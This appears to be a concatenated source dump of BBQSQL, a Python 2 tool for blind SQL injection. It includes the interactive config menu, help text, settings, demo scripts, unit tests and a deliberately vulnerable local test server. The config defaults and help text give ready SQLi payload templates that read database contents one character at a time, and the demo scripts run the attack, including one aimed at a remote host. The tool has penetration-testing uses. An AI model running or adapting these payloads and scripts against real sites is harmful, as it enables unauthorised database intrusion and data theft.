                    for key in exclude_parms:
                        if key in attack_config:
                            del(attack_config[key])

                    # launch attack
                    bbq = bbqsql.BlindSQLi(**attack_config)
                    if not bbq.error:
                        error = None
                        try:
                            ok = raw_input('Everything lookin groovy?[y,n] ')
                        except KeyboardInterrupt:
                            ok = False
                        if ok and ok[0] != 'n':
                            #print bbq
                            #time.sleep(5)
                            results = bbq.run()
                            #output to a file if thats what they're into
                            if bbqsql_config['csv_output_file']['value'] is not None:
                                f = open(bbqsql_config['csv_output_file']['value'],'w')
                                f.write("\n".join(results))
                                f.close()
                    else:
                        error = bbq.error
                    # delete stuff
                    del(bbq)
                if choice == '6':
                    bbq_core.about()

            bbq_core.ExitBBQ(0)
            
        # ## handle keyboard interrupts
        except KeyboardInterrupt:
            print "\n\n Cath you later " + bbq_core.bcolors.RED+"@" + bbq_core.bcolors.ENDC+" the dinner table."


if __name__ == '__main__':
    parser = argparse.ArgumentParser(prog='bbqsql')
    parser.add_argument('-V', '--version', action='version', version='%(prog)s 1.0')
    parser.add_argument('-c',  metavar='config', nargs='+', help='import config file', default=None)

    results = parser.parse_args()
    print results

    if results.c is not None:
        bbqMenu(results.c[0])
    else:
        bbqMenu()

########NEW FILE########
__FILENAME__ = config
import bbq_core
from bbq_core import bcolors
import text
import ast

try:
    import readline
except ImportError:
    pass

from urlparse import urlparse
from urllib import quote
from gevent import socket
import os
import sys

response_attributes = ['status_code', 'url', 'time', 'size', 'text', 'content', 'encoding', 'cookies', 'headers', 'history']

DEBUG = False
def debug(fn):
    '''debugging decorator'''
    def wrapped(*args,**kwargs):
        if DEBUG: print 'Calling into %s' % fn.__name__
        rval = fn(*args,**kwargs)
        if DEBUG: print 'Returning from %s' % fn.__name__
        return rval
    return wrapped

class ConfigError(Exception):
    '''Throw this exception when a method that hasn't been implemented gets called'''
    def __init__(self, value):
        self.value = value
    def __repr__(self):
        return "You have a config error: " + self.value

@debug
def validate_allow_redirects(thing):
    if type(thing['value']) == str:
        if thing['value'].lower() == 'false':
            thing['value'] = False
        else:
            thing['value'] = True
    
    return True

@debug
def validate_ath(thing):
    if not (len(thing['value'])==2 and type(thing['value'][0])==str and type(thing['value'][1])==str):
        raise ConfigError("auth should be a tuple of two strings. Eg. ('username','password')")

    return True

@debug
def validate_cookies(thing):
    if type(thing['value']) == str:
        try:
            list_cookies = thing['value'].split(';')
            dict_cookies = {}
            for c in list_cookies:
                parts = c.split('=',1)
                dict_cookies[parts[0]] = parts[1].strip()
            thing['value'] = dict_cookies
        except:
            raise ConfigError("You provided your cookies as a string. Thats okay, but it doesn't look like you formatted them properly")
    for k in thing['value']:
        if type(k) != str  or type(thing['value'][k]) != str:
            raise ConfigError("Keys and values for cookies need to be strings.")
    
    return True

@debug
def validate_headers(thing):
    if type(thing['value']) == str:
        try:
            parts = thing['value'].split(':')
            headers = {parts[0]:parts[1].strip()}
            thing['value'] = headers
        except:
            raise ConfigError("You provided your headers as a string. Thats okay, but it doesn't look like you formatted them properly")
    for k in thing['value']:
        if type(k) != str  or type(thing['value'][k]) != str:
            raise ConfigError("Keys and values for headers need to be strings.")
    
    return True

@debug
def validate_data(thing):
    if type(thing['value']) == dict:
        for k in thing['value']:
            if type(k) != str or type(thing["value"][k]) != str:
                raise ConfigError('You provided your data as a dict. The keys and values need to be strings')
    
    return True

@debug
def validate_files(thing):
    if type(thing['value']) == str:
        try:
            f = open(thing['value'],'r')
            n = os.path.basename(thing['value'])
            thing['value'] = {n:f}
        except:
            raise ConfigError("You provided files as a string. I couldn't find the file you specified")
    
    for k in thing['value']:
        if type(thing['value'][k]) != file:
            raise ConfigError("You have a non-file object in the file parameter.")
    
    return True

@debug
def validate_method(thing):
    if thing['value'].lower() not in ['get','options','head','post','put','patch','delete']:
        raise ConfigError("The valid options for method are: ['get','options','head','post','put','patch','delete']")

    return True

@debug
def validate_params(thing):
    if type(thing['value']) == dict:
        for k in thing['value']:
            if type(k) != str or type(thing['value'][k]) != str:
                raise ConfigError("You provided params as a dict. Keys are values for this dict must be strings.")
    
    return True

@debug
def validate_url(thing):
    parsed_url = urlparse(str(thing['value']))
    netloc = parsed_url.netloc.split(':')[0]
    # this is slowing us down. gotta cut it loose
    '''
    try:
        socket.gethostbyname(netloc)
    except socket.error,err:
        raise ConfigError('Invalid host name. Cannot resolve. Socket Error: %s' % err)
    '''
    if parsed_url.scheme.lower() not in ['http','https']:
        raise ConfigError('Invalid url scheme. Only http and https')
    
    return True

class RequestsConfig:
    config = {\
        'allow_redirects':\
            {'name':'allow_redirects',\
            'value':None,\
            'description':'A bool (True or False) that determines whether HTTP redirects will be followed when making requests.',\
            'types':[bool],\
            'required':False,\
            'validator':validate_allow_redirects},\
        'auth':\
            {'name':'auth',\
            'value':None,\
            'description':'A tuple of username and password to be used for http basic authentication. \nEg.\n("myusername","mypassword")',\
            'types':[tuple],
            'required':False,\
            'validator':validate_ath},\
        'cookies':\
            {'name':'cookies',\
            'value':None,\
            'description':'A dictionary or string of cookies to be sent with the requests. \nEg.\n{"PHPSESSIONID":"123123"}\nor\nPHPSESSIONID=123123;JSESSIONID=foobar',\
            'types':[dict,str],\
            'required':False,\
            'validator': validate_cookies},\
        'data':\
            {'name':'data',\
            'value':None,\
            'description':'POST data to be sent along with the request. Can be dict or str.\nEg.\n{"input_field":"value"}\nor\ninput_field=value',\
            'types':[dict,str],\
            'required':False,\
            'validator': validate_data},\
        'files':\
            {'name':'files',\
            'value':None,\
            'description':'Files to be sent with the request. Set the value to the path and bbqSQL will take care of opening/including the file...',\
            'types':[dict,str],\
            'required':False,\
            'validator': validate_files},\
        'headers':\
            {'name':'headers',\
            'value':None,\
            'description':'HTTP headers to be send with the requests. Can be string or dict.\nEg.\n{"User-Agent":"bbqsql"}\nor\n"User-Agent: bbqsql"',\
            'types':[dict,str],\
            'required':False,\
            'validator': validate_headers},\
        'method':\
            {'name':'method',\
            'value':'GET',\
            'description':"The valid options for method are: ['get','options','head','post','put','patch','delete']",\
            'types':[str],\
            'required':True,\
            'validator':validate_method},\
        'proxies':\
            {'name':'proxies',\
            'value':None,\
            'description':'HTTP proxies to be used for the request.\nEg.\n{"http": "10.10.1.10:3128","https": "10.10.1.10:1080"}',\
            'types':[dict],\
            'required':False,\
            'validator':None},\
        'url':\
            {'name':'url',\
            'value':'http://example.com/sqlivuln/index.php?username=user1&password=secret${injection}',\
            'description':'The URL that requests should be sent to.',\
            'types':[str],\
            'required':True,\
            'validator':validate_url}}

    menu_text = "We need to determine what our HTTP request will look like. Bellow are the\navailable HTTP parameters. Please enter the number of the parameter you\nwould like to edit. When you are done setting up the HTTP parameters,\nyou can type 'done' to keep going.\n"

    prompt_text = "http_options"

    def validate(self,quiet=False):
        ''' Check if all the config parameters are properly set'''
        valid = True
        for key in self.config:
            # if there is not value and a value is required, we have a problem
            if self.config[key]['value'] == None:
                if self.config[key]['required']:
                    valid = False
                    if not quiet: print bcolors.RED + ("You must specify a value for '%s'" % key) + bcolors.ENDC
            
            # if the config keys validator fails, we have a problem
            elif self.config[key]['validator']:
                try:
                    self.config[key]['validator'](self.config[key])
                except ConfigError, err:
                    if not quiet: print bcolors.RED + repr(err) + bcolors.ENDC
                    valid = False
        return valid
    
    def get_config(self):
        '''Return a dict of all the set config parameters'''
        # make sure we're on the up and up
        kwargs = {}
        for key in self.config:
            if self.config[key]['value'] != None:
                kwargs[key] = self.config[key]['value']
        return kwargs

    def set_config(self,config):
        '''take a dict of all the config parameters and apply it to the config object'''
        for key in config:
            if key in self.config:
                if(self.config[key]['types'] == [str]):
                    self.config[key]['value'] = config[key]
                else:
                    try:
                        self.config[key]['value'] = ast.literal_eval(config[key])
                    except (ValueError, SyntaxError):
                        self.config[key]['value'] = config[key]
        self.validate()
    
    def run_config(self):
        '''run a configuration menu'''
        config_keys = self.config.keys()
        choice = ''
        while choice not in ['done','back','quit','exit',99,'99']:
            bbq_core.show_banner()
            http_main_menu = bbq_core.CreateMenu(self.menu_text, [])
            
            for ki in xrange(len(config_keys)):
                key = config_keys[ki]
                print "\t%d) %s" % (ki,key)
                if self[key]['value'] is not None:
                    print "\t   Value: %s" % str(self[key]['value'])
            print "\n\t99) Go back to the main menu"
            print "\n"
            self.validate()

            #get input
            choice = (raw_input(bbq_core.setprompt(self.prompt_text)))
            #convert to int
            try:
                choice = int(choice)
            except ValueError:
                pass
            
            if choice in range(len(config_keys)):
                key = config_keys[choice]
                bbq_core.show_banner()
                print "Parameter    : %s" % key
                print "Value        : %s" % repr(self[key]['value'])
                print "Allowed types: %s" % repr([t.__name__ for t in self[key]['types']])
                print "Required     : %s" % repr(self[key]['required'])
                desc = self[key]['description'].split("\n")
                desc = "\n\t\t".join(desc)
                print "Description  : %s" % desc
                self.validate()
                print "\nPlease enter a new value for %s.\n" % key
                
                value = raw_input(bbq_core.setprompt(self.prompt_text,config_keys[choice]))
                try:
                    value = eval(value)
                except:
                    pass
                self[key]['value'] = None if value == '' else value
            
        if choice in ['exit','quit']:
            bbq_core.ExitBBQ(0)
    
    def keys(self):
        return self.config.keys()
    
    def __iter__(self):
        for key in self.config:
            yield key
        raise StopIteration
    
    def __getitem__(self,key):
        if key not in self.config:
            raise KeyError
        return self.config[key]
    
    def __getattr__(self,key):
        print key
        print self.__class__
        if key not in self.config:
            raise KeyError
        return self.config[key]

    def __setitem__(self,key,val):
        self.config[key] = val
    
    def __setattr__(self,key,value):
        if key not in self.config:
            raise KeyError
        self.config[key] = val

    def __repr__(self):
        out = {}
        for key in self.config:
            out[key] = self.config[key]['value']
        return repr(out)
    
    def __str__(self):
        return self.__repr__()

@debug
def validate_hooks_file(thing):
    # don't want to import multiple times. this also keeps track of if it was successful
    if thing['value'] and thing['value'] is not thing['last_imported']:
        # cannonicalize the path
        full_path = os.path.realpath(os.path.expanduser(os.path.expandvars(thing['value'])))

        #make sure its real
        if not os.path.exists(full_path):
            raise ConfigError("The hooks_file path you specified doesn't exist. try again")

        # grab just the dir portion of the path
        head,tail = os.path.split(full_path)

        # prepend this to our search path
        sys.path.insert(0,head)

        # get the module name from the file name
        mname = tail.rsplit('.',1)

        # make sure they gave a good file
        if len(mname) != 2 or mname[1] != 'py':
            raise ConfigError("The hooks_file needs to be a python file. It should look like ~/foo/bar/myhooks.py")

        # try importing it
        try:
            exec "import %s as new_user_hooks" % mname[0]
        except Exception,e:
            raise ConfigError("You have the following problem with your hooks file: %s - %s" % (str(type(e)),e.message))

        # extract the callable objects that don't start with _ from the newly imported module
        new_hooks_dict = {}
        for f_name in dir(new_user_hooks):
            f = getattr(new_user_hooks,f_name)
            if hasattr(f,'__call__') and f.__module__ == mname[0] and not f_name.startswith('_'):
                new_hooks_dict[f_name] = f

        # initialize or reinitialize the thing['hooks_dict']
        if not thing['hooks_dict'] or raw_input('would you like to wipe existing hooks? (y/n) [n]: ') == 'y':
                thing['hooks_dict'] = {}

        # merge our new hooks with our existing hooks
        thing['hooks_dict'].update(new_hooks_dict)

        # clean up 
        new_user_hooks = None

        # specify the file we just imported
        thing['last_imported'] = thing['value']

        print "Successfully imported hooks from %s" % full_path
        print thing['hooks_dict']

    if thing['value'] == '':
        thing['hooks_dict'] = None
        thing['value'] = None

    return True

@debug
def validate_concurrency(thing):
    try:
        thing['value'] = int(thing['value'])
    except ValueError:
        raise ConfigError('You need to give a numeric value for concurrency')

    return True

@debug
def validate_comparison_attr(thing):
    if thing['value'] not in response_attributes:
        raise ConfigError("You must choose a valid comparison_attr. Valid options include %s" % str(response_attributes))
    
    return True

@debug
def validate_search_type(thing):
    if thing['value'] not in ['binary_search','frequency_search']:
        if 'binary' in thing['value']:
            thing['value'] = 'binary_search'
        elif 'frequency' in thing['value']:
            thing['value'] = 'frequency_search'
        else:
            raise ConfigError('You need to set search_type to either "binary_search" or "frequency_search"')
        
    return True

@debug
def validate_query(thing):
    if type(thing['value']) != str:
        raise ConfigError("looks like query is a %s. it should be a string..."%type(thing))
    return True


class bbqsqlConfig(RequestsConfig):
    config = {\
        'hooks_file':\
            {'name':'hooks_file',\
            'value':None,\
            'description':'Specifies the .py file where the requests hooks exist. This file should contain functions like `pre_request`,`post_request`,`args`,....',\
            'types':[str],\
            'required':False,\
            'validator':validate_hooks_file,
            'last_imported':None,\
            'hooks_dict':None},\
        'concurrency':\
            {'name':'concurrency',\
            'value':30,\
            'description':'Controls the amount of concurrency to run the attack with. This is useful for throttling the requests',\
            'types':[str,int],\
            'required':True,\
            'validator':validate_concurrency},\
        'csv_output_file':\
            {'name':'csv_output_file',\
            'value':None,\
            'description':'The name of a file to output the results to. Leave this blank if you dont want output to a file',\
            'types':[str],\
            'required':False,\
            'validator':None},\
        'comparison_attr':\
            {'name':'comparison_attr',\
            'value':'size',\
            'description':"Which attribute of the http response bbqsql should look at to determine true/false. Valid options include %s" % str(response_attributes),\
            'types':[str],\
            'required':True,\
            'validator':validate_comparison_attr},\
        'technique':\
            {'name':'technique',\
            'value':'binary_search',\
            'description':'Determines the method for searching. Can either do a binary search algorithm or a character frequency based search algorithm. You probably want to use binary. The allowed values for this are "binary_search" or "frequency_search".',\
            'types':[str],\
            'required':True,\
            'validator':validate_search_type},\
        'query':\
            {'name':'query',\
            'value':"' and ASCII(SUBSTR((SELECT data FROM data ORDER BY id LIMIT 1 OFFSET ${row_index:1}),${char_index:1},1))${comparator:>}${char_val:0} #",\
            'description':text.query_text,\
            'types':[str],\
            'required':True,\
            'validator':validate_query}}

    menu_text = "Please specify the following configuration parameters.\n"
    prompt_text = "attack_options"

########NEW FILE########
__FILENAME__ = text
'''Text should be stored here'''

from bbq_core import bcolors

define_version = '1.0'

main_text = " Select from the menu:\n"

main_menu = ['Setup HTTP Parameters',
	     'Setup BBQSQL Options',
         'Export Config',
         'Import Config',
	     'Run Exploit',
	     'Help, Credits, and About']	     


query_text = """
The query input is where you will construct your query used
to exfiltrate information from the database.  The assumption is
that you already have identified SQL injection on a vulnerable
parameter, and have tested a query that is successful.

Below is an example query you can use to construct your query.
In this example, the attacker is looking to select hostname from a table called systems :

""" + bcolors.RED + """
' and ASCII(SUBSTR((SELECT hostname FROM systems LIMIT 1 OFFSET 
${row_index:1}),${char_index:1},1))${comparator:>}${char_val:0} #
""" + bcolors.ENDC + """

You need to provide the following tags 
in order for the attack to work.  The format is ${template_name:default_value}.
The template names you have available are defined below.  Once you 
put these in your 
query, bbqsql will do the rest:

""" + bcolors.BOLD + """${row_index:1}""" + bcolors.ENDC + """= This tells bbqsql to iterate rows here.  Since
we are using LIMIT we can view n number of rows depending on
${row_index} value.  Here we set it to 1, sto start with row 1.  
If your attack fails at row n, you can 
edit this value to resume your attack.  

""" + bcolors.BOLD + """${char_index:1}""" + bcolors.ENDC + """ = This tells bbqsql which character from the 
subselect to query.  Here we start with position 1 of the subselect.  
You should always set this to a value of 1
unless your attack failed at a certain character position.  

""" + bcolors.BOLD + """${comparator:>}""" +  bcolors.ENDC + """This is how you tell BBQSQL to compare the responses 
to determine if the result is true or not.  You should set this to the > symbol.

""" + bcolors.BOLD + """${char_val:0}""" + bcolors.ENDC + """ = This tells bbqsql where to compare the results
from the subselect to validate the result.  Set this to 0 and the search 
algorithm will do the rest.  

""" + bcolors.BOLD + """${sleep}""" + bcolors.ENDC + """ = This is optional but tells bbqsql where to insert
the number of seconds to sleep when performing time based sql 
injection


"""

########NEW FILE########
__FILENAME__ = settings
#file: settings.py

#######################
# General Stuff
#######################

CHARSET = [chr(x) for x in xrange(32,127)]
#CHARSET = [chr(x) for x in xrange(32,39)] + [chr(x) for x in xrange(40,127)] #everything but '
CHARSET_LEN = len(CHARSET)

# Supress output when possible
QUIET = False

# Debugging
DEBUG_FUNCTION_CALLS = False
DEBUG_FUNCTION_ARGUMENTS = False
DEBUG_FUNCTION_RETURNS = False
DEBUG_FUNCTION_RETURN_VALUES = False

#Do fancy pretty printing of results as they come in?
PRETTY_PRINT = True
#How often to refresh the screen while pretty printing (lower looks better but is processor intensive)
PRETTY_PRINT_FREQUENCY = .2

COLORS = {\
    'success':'\033[0m',\
    'working':'\033[92m',\
    'error':'\033[101m',\
    'unknown':'\033[101m',\
    'endc':'\033[0m'}

#######################
# Blind Technique Stuff
#######################

#How many base requests to make to setup Truth() objects
TRUTH_BASE_REQUESTS = 5

# These are the available comparison operators as well as their oposites.
OPPOSITE_COMPARATORS = {"<":">",">":"<","=":"!=","!=":"="}

########NEW FILE########
__FILENAME__ = utilities
#file: utilities.py

import bbqsql

#############
# Exceptions
#############

class NotImplemented(Exception):
    '''Throw this exception when a method that hasn't been implemented gets called'''
    def __init__(self, value):
        self.value = value
    def __repr__(self):
        return "This isn't implemented yet: " + self.value

class TrueFalseRangeOverlap (Exception):
    '''Throw this exception when the nature of truth comes into question'''
    def __init__(self, value):
        self.value = value
    def __repr__(self):
        return "The nature of truth is no longer self-evident: " + self.value

class ValueDoesntMatchCase (Exception):
    '''Thrown by requester when a value we are testing for doesnt match any of our established cases'''
    def __init__(self, value):
        self.value = value
    def __repr__(self):
        return "We have an outlier.... The value doesn't match any known case. Dunno what to do \0/: " + self.value

class SendRequestFailed (Exception):
    '''Throw this exception when a sending a request fails'''
    def __init__(self, value):
        self.value = value
    def __repr__(self):
        return "Sending the request failed. Dunno why." + self.value


############
# Debugging
############

def debug(fn):
    '''debugging decorator'''
    def wrapped(*args,**kwargs):
        if bbqsql.settings.DEBUG_FUNCTION_CALLS: print 'Calling into %s' % fn.__name__
        if bbqsql.settings.DEBUG_FUNCTION_ARGUMENTS: print 'Arguments: args:%s - kwargs:%s' % (repr(args),repr(kwargs))
        rval = fn(*args,**kwargs)
        if bbqsql.settings.DEBUG_FUNCTION_RETURNS: print 'Returning from %s' % fn.__name__
        if bbqsql.settings.DEBUG_FUNCTION_RETURN_VALUES: print 'Returning value: %s' % repr(rval)
        return rval
    return wrapped

def force_debug(fn):
    '''debugging decorator'''
    def wrapped(*args,**kwargs):
        print 'Calling into %s' % fn.__name__
        print 'Arguments: args:%s - kwargs:%s' % (repr(args),repr(kwargs))
        rval = fn(*args,**kwargs)
        print 'Returning from %s' % fn.__name__
        print 'Returning value: %s' % repr(rval)
        return rval
    return wrapped
########NEW FILE########
__FILENAME__ = demo
import bbqsql
from time import time
from urllib import quote

#REMOTE STATUS CODE BASED EXAMPLE
'''
url     = bbqsql.Query('http://btoe.ws:8090/error?${injection}')
query   = bbqsql.Query("row_index=${row_index:1}&character_index=${char_index:1}&character_value=${char_val:0}&comparator=${comparator:>}",encoder=quote)

bh      = bbqsql.BlindSQLi(url=url,query=query,method='GET',comparison_attr='status_code',technique='binary_search',concurrency=100)

start = time()
results = bh.run()
stop = time()

print "dumped db in %f seconds" % (stop-start)
'''

'''
#STATUS CODE BASED EXAMPLE
url     = bbqsql.Query('http://127.0.0.1:8090/error?${injection}')
query   = bbqsql.Query("row_index=${row_index:1}&character_index=${char_index:1}&character_value=${char_val:0}&comparator=${comparator:>}",encoder=quote)

bh      = bbqsql.BlindSQLi(url=url,query=query,method='GET',comparison_attr='status_code',technique='frequency_search',concurrency=35)

start = time()
results = bh.run()
stop = time()

print "dumped db in %f seconds" % (stop-start)
'''

#SIZE BASED EXAMPLE
url     = bbqsql.Query('http://127.0.0.1:8090/boolean?${injection}')
query   = bbqsql.Query("row_index=${row_index:1}&character_index=${char_index:1}&character_value=${char_val:0}&comparator=${comparator:>}",encoder=quote)

bh      = bbqsql.BlindSQLi(url=url,query=query,method='GET',comparison_attr='size',technique='frequency_search',concurrency=3)

start = time()
results = bh.run()
stop = time()

print "dumped db in %f seconds" % (stop-start)

#TEXT BASED EXAMPLE
'''
url     = bbqsql.Query('http://127.0.0.1:8090/boolean?${injection}')
query   = bbqsql.Query("row_index=${row_index:1}&character_index=${char_index:1}&character_value=${char_val:0}&comparator=${comparator:>}",encoder=quote)

bh      = bbqsql.BlindSQLi(url=url,query=query,method='GET',comparison_attr='text',technique='frequency_search',concurrency=35)

start = time()
results = bh.run()
stop = time()

print "dumped db in %f seconds" % (stop-start)
'''

# TIME BASED EXAMPLE
'''
url = bbqsql.Query('http://127.0.0.1:8090/time?${query}')
query = bbqsql.Query("row_index=${row_index:1}&character_index=${char_index:1}&character_value=${char_val:0}&comparator=${comparator:>}&sleep=.2",encoder=quote)

bh = bbqsql.BlindSQLi(url=url,query=query,comparison_attr='time',technique='binary_search',concurrency=50)
start = time()
results = bh.run()
stop = time()

print "dumped db in %f seconds" % (stop-start)
'''

########NEW FILE########
__FILENAME__ = test
import bbqsql
import unittest
from urllib import quote


#We don't need all the output....
bbqsql.settings.PRETTY_PRINT = False
bbqsql.settings.QUIET = False
test_data = ['hello','world']

class TestBinaryTechnique(unittest.TestCase):
    def test_binary_technique(self):
        url     = bbqsql.Query('http://127.0.0.1:8090/boolean?${injection}')
        query   = bbqsql.Query("row_index=${row_index:1}&character_index=${char_index:1}&character_value=${char_val:0}&comparator=${comparator:>}",encoder=quote)
        b      = bbqsql.BlindSQLi(url=url,query=query,method='GET',comparison_attr='size',technique='binary_search',concurrency=10)
        results = b.run()
        self.assertEqual(results,test_data)

    def test_frequency_technique(self):
        url     = bbqsql.Query('http://127.0.0.1:8090/boolean?${injection}')
        query   = bbqsql.Query("row_index=${row_index:1}&character_index=${char_index:1}&character_value=${char_val:0}&comparator=${comparator:>}",encoder=quote)
        b      = bbqsql.BlindSQLi(url=url,query=query,method='GET',comparison_attr='size',technique='frequency_search',concurrency=5)
        results = b.run()
        self.assertEqual(results,test_data)

if __name__ == "__main__":
    unittest.main() 

########NEW FILE########
__FILENAME__ = test_server
#!/usr/bin/env python
# By Scott Behrens(arbit), 2012 

"""This is a simple webserver vulnerable to SQLi injection
make your query string look like this: http://127.0.0.1:8090/time?row_index=1&character_index=1&character_value=95&comparator=>&sleep=1

command line usage:
    python ./test_server.py [--rows=50 --cols=150]
        :rows   -   this controls how many rows of random data to use for the database
        :cols   -   this controls how many rows of random data to use for the database
"""

import eventlet 
from eventlet import wsgi
from eventlet.green import time
from urlparse import parse_qs
from random import random,choice

datas = ['hello','world']

# Different comparators BBsql uses
comparators = ['<','=','>','false']


def parse_response(env, start_response):
    '''Parse out all necessary information and determine if the query resulted in a match'''

    #add in some random delay
    delay = random()
    time.sleep(delay/10)

    try:
        params =  parse_qs(env['QUERY_STRING'])

        # Extract out all of the sqli information
        row_index =  int(params['row_index'][0])
        char_index = int(params['character_index'][0]) - 1
        test_char = int(params['character_value'][0])
        comparator = comparators.index(params['comparator'][0]) - 1
        try:
            sleep_int = float(params['sleep'].pop(0))
        except KeyError:
            sleep_int = 1

        # Determine which character position we are at during the injection
        current_character = datas[row_index][char_index]

        # figure out if it was true
        truth = (cmp(ord(current_character),test_char) == comparator)

        #some debugging
        #print "\n\n"
        #print "%d %s %d == %s" % (ord(current_character),params['comparator'][0],test_char,str(truth))
        #print "char_index       : %d" % char_index
        #print "row_index        : %d" % row_index

        # Call the function for what path was given based on the path provided
        response = types[env['PATH_INFO']](test_char, current_character, comparator, sleep_int, start_response,truth)

        return response
    except:
        start_response('400 Bad Request', [('Content-Type', 'text/plain')])
        return ['error\r\n']


def time_based_blind(test_char, current_character, comparator, sleep_int, start_response,truth):
    # Snage the query string and parse it into a dict
    sleep_time = sleep_int * truth
    time.sleep(sleep_time)
    start_response('200 OK', [('Content-Type', 'text/plain')])
    return ['Hello!\r\n']


def boolean_based_error(test_char, current_character, comparator, env, start_response,truth):
    # Snage the query string and parse it into a dict
    if truth:
        start_response('200 OK', [('Content-Type', 'text/plain')])
        return ['Hello, im a bigger cheese in this cruel World!\r\n']
    else:
        start_response('404 File Not Found', [('Content-Type', 'text/plain')])
        return ['file not found: error\r\n']


def boolean_based_size(test_char, current_character, comparator, env, start_response,truth):
    # Snage the query string and parse it into a dict
    if truth:
        start_response('200 OK', [('Content-Type', 'text/plain')])
        return ['Hello, you just submitted a query and i found a match\r\n']
    else:
        start_response('200 OK', [('Content-Type', 'text/plain')])
        return ['Hello, no match!\r\n']
        
# Dict of the type's of tests, so pass your /path to execute that type of test
types = {'/time':time_based_blind,'/error':boolean_based_error,'/boolean':boolean_based_size} 

if __name__ == "__main__":
    # Start the server
    print "\n"
    print "bbqsql http server\n\n"
    print "used to unit test boolean, blind, and error based sql injection"
    print "use the following syntax: http://127.0.0.1:8090/time?row_index=1&character_index=1&character_value=95&comparator=>&sleep=1"
    print "path can be set to /time,  /error, or /boolean"
    print "\n"

    from sys import argv    
    import re

    CHARSET = [chr(x) for x in xrange(32,127)]

    rre = re.compile(u'--rows=[0-9]+')
    cre = re.compile(u'--cols=[0-9]+')
    rows = filter(rre.match,argv)
    cols = filter(cre.match,argv)

    if rows and cols:
        rows = rows[0]
        cols = cols[0]

        CHARSET = [chr(x) for x in xrange(32,127)]
        datas = []
        for asdf in range(5):
            datas.append("")
            for fdsa in range(100):
                datas[-1] += choice(CHARSET)

    wsgi.server(eventlet.listen(('', 8090)), parse_response)

########NEW FILE########
